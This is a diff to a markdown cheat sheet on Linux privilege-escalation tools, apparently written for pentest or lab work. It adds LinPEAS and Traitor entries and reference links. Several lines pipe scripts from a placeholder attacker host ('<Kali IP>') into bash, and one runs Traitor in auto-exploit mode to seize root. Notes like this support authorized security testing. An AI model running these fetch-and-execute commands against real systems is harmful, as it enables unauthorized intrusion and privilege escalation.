@@ -2,8 +2,6 @@
 
 ## Linux
 
-### LinEnum.sh
-
 - HTTP
 
 Host the file
@@ -12,10 +10,24 @@ cd /opt/linux_privesc
 sudo python -m http.server 80
 ```
 
+
+### LinPEAS
+
+```
+curl http://<Kali IP>/linpeas.sh | bash
+```
+or
+```
+wget http://<Kali IP>/linpeas.sh
+bash linpeas.sh
+```
+
+### LinEnum.sh
+
 ```
 curl http://<Kali IP>/LinEnum.sh | bash
 ```
-
+or
 ```
 wget http://<Kali IP>/LinEnum.sh
 bash LinEnum.sh
@@ -23,17 +35,17 @@ bash LinEnum.sh
 
 ### linuxprivchecker.py
 
-- HTTP
-
-Host the file
-```
-cd /opt/linux_privesc
-sudo python -m http.server 80
-```
-
 ```
 wget http://<Kali IP>/linuxprivchecker.py
 python linuxprivchecker.py
+```
+
+### Trator
+
+```
+wget http://<Kali IP>/traitor-amd64
+chmod +x traitor-amd64
+./traitor-amd64 -a
 ```
 
 
@@ -130,5 +142,8 @@ Invoke-AllChecks
 # Links
 
 - [Basic Linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+- [Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 - [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
 - [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)
+- [Trator](https://github.com/liamg/traitor)
+- [GTFOBins](https://gtfobins.github.io/)
